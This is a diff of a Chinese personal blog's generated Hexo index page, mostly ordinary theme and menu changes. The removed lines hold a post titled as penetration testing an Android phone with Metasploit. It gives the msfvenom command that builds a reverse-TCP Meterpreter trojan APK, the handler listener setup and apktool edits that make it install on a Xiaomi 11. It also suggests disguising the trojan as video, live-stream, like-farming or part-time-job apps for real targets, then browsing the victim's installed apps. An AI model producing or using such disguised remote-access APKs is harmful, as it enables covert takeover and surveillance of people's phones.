@@ -17,13 +17,15 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"sw-back.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"sw-back.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="website">
+  <meta name="description" content="平平无奇的网站">
+<meta property="og:type" content="website">
 <meta property="og:title" content="SwBack的博客">
 <meta property="og:url" content="https://sw-back.github.io/index.html">
 <meta property="og:site_name" content="SwBack的博客">
+<meta property="og:description" content="平平无奇的网站">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="SwBack">
 <meta name="twitter:card" content="summary">
@@ -95,11 +97,11 @@
       <h1 class="site-title">SwBack的博客</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">个人博客</p>
   </div>
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -114,25 +116,74 @@
     <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
 
   </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
 
   </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-fw fa-calendar"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 </nav>
 
 
 
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
 
 </div>
     </header>
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
+  <div class="reading-progress-bar"></div>
 
 
     <main class="main">
@@ -146,12 +197,12 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sw-back.github.io/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+    <link itemprop="mainEntityOfPage" href="https://sw-back.github.io/2022-11-12/hexo%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.png">
       <meta itemprop="name" content="SwBack">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="平平无奇的网站">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -160,7 +211,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">通过msf对安卓手机渗透测试</a>
+            <a href="/2022-11-12/hexo%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/" class="post-title-link" itemprop="url">hexo操作指南</a>
         </h2>
 
         <div class="post-meta">
@@ -171,7 +222,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-11-12 19:29:18 / 修改时间：19:32:33" itemprop="dateCreated datePublished" datetime="2022-11-12T19:29:18+08:00">2022-11-12</time>
+              <time title="创建时间：2022-11-12 20:27:27 / 修改时间：21:15:01" itemprop="dateCreated datePublished" datetime="2022-11-12T20:27:27+08:00">2022-11-12</time>
             </span>
 
           
@@ -185,65 +236,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>环境配置</p>
-<table>
-<thead>
-<tr>
-<th>工具</th>
-<th>型号</th>
-<th>接入方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>kali</td>
-<td>2021</td>
-<td>桥接</td>
-</tr>
-<tr>
-<td>安卓手机</td>
-<td>小米11</td>
-<td>WIFI</td>
-</tr>
-<tr>
-<td>Android Killer</td>
-<td>V1.3.1.0</td>
-<td>apktools 2.6.1</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>实验过程中小米11 未提示风险，(仅签名问题提示非小米应用商店app)</p>
-<p>实战过程中可以对app进行伪装，修改图标,标题,版本，签名</p>
-<p>如(XX直播,XX视频,刷赞,兼职,XX游戏等等)</p>
-</blockquote>
-<p>启动kali后,先查看自己本机IP地址如下</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─# ip a                                           </span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:91:2d:65 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.0.105/24 brd 192.168.0.255 scope global dynamic noprefixroute eth0</span><br><span class="line">       valid_lft 6529sec preferred_lft 6529sec</span><br><span class="line">    inet6 fe80::20c:29ff:fe91:2d65/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>然后执行如下命令生成木马文件.<br>这里监听了5555端口</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=5555 R &gt;Android.apk</span><br></pre></td></tr></table></figure>
-
-<p>开启msf后，加载攻击载荷</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置监听IP</span></span><br><span class="line">set LHOST 192.168.0.105</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置监听端口</span></span><br><span class="line">set LPORT 5555</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进行监听</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>这里的apk还无法直接在安卓中运行。</p>
-<p>提示如下:</p>
-<p><img src="/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824194539570.png" alt="image-20220824194539570"></p>
-<p>通过对apk反编译。</p>
-<p>网上说修改AndroidManifest.xml 文件.</p>
-<p>不过该文件需要反编译才能查看。推荐使用<code>xml2axml.jar</code>工具进行,该工具可以直接反编译和编译。</p>
-<p>这里我们修改<code>apktool.yml</code></p>
-<p>将<code>minSdkVersion</code>修改为<code>16</code></p>
-<p><code>targetSdkVersion</code>修改为<code>23</code></p>
-<p><img src="/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824194807762.png" alt="image-20220824194807762"></p>
-<p>对其进行编译</p>
-<p><img src="/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824194910430.png" alt="image-20220824194910430"></p>
-<p>导入手机安装运行之后kali 回显如下内容证明攻击成功。</p>
-<p><img src="/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824195040373.png" alt="image-20220824195040373"></p>
-<p>执行下命令<code>app_list</code> 查看下软件列表，看下用什么app看<strong>视频</strong></p>
-<p><img src="/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824195159155.png" alt="image-20220824195159155"></p>
-<p><img src="/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824195213870.png" alt="image-20220824195213870"></p>
-<p>在这里可以通过? 进行查看命令</p>
-<p><img src="/2022-11-12/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824195256176.png" alt="image-20220824195256176"></p>
-
+          <p>关于hexo的基本操作，目前用到哪里记录到哪里.</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022-11-12/hexo%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -262,12 +263,12 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sw-back.github.io/2022-11-12/hello-world/">
+    <link itemprop="mainEntityOfPage" href="https://sw-back.github.io/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.png">
       <meta itemprop="name" content="SwBack">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="平平无奇的网站">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -276,7 +277,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022-11-12/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+            <a href="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">通过msf对安卓手机渗透测试</a>
         </h2>
 
         <div class="post-meta">
@@ -286,8 +287,15 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2022-11-12 17:00:21" itemprop="dateCreated datePublished" datetime="2022-11-12T17:00:21+08:00">2022-11-12</time>
+              <time title="创建时间：2022-08-24 19:58:00" itemprop="dateCreated datePublished" datetime="2022-08-24T19:58:00+08:00">2022-08-24</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-12 21:10:57" itemprop="dateModified" datetime="2022-11-12T21:10:57+08:00">2022-11-12</time>
+              </span>
 
           
 
@@ -300,20 +308,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
+          <p>通过msf对安卓手机渗透测试</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -386,8 +389,10 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="SwBack"
+      src="/images/avatar.png">
   <p class="site-author-name" itemprop="name">SwBack</p>
-  <div class="site-description" itemprop="description"></div>
+  <div class="site-description" itemprop="description">平平无奇的网站</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
@@ -400,10 +405,36 @@
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/SW-BACK/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;SW-BACK&#x2F;" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_30817059" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_30817059" rel="noopener" target="_blank"><i class="fa fa-fw fa-bookmark"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://plus.google.com/yourname" title="知乎 → https:&#x2F;&#x2F;plus.google.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-bookmark"></i>知乎</a>
+      </span>
+  </div>
 
 
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctf.swback.cn/" title="https:&#x2F;&#x2F;ctf.swback.cn" rel="noopener" target="_blank">CTF竞技平台</a>
+        </li>
+    </ul>
+  </div>
 
       </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
 
     </div>
   </aside>
@@ -418,20 +449,48 @@
         
 
         
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">1 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=1" rel="noopener" target="_blank">苏ICP备2021003777号 </a>
+  </div>
 
 <div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
-    <i class="fa fa-user"></i>
+    <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">SwBack</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
-  </div>
+
+
+
+
+
+<!-- 在上面插入代码 -->
+
 
         
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
 
 
 
@@ -465,6 +524,10 @@
   
 
 
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
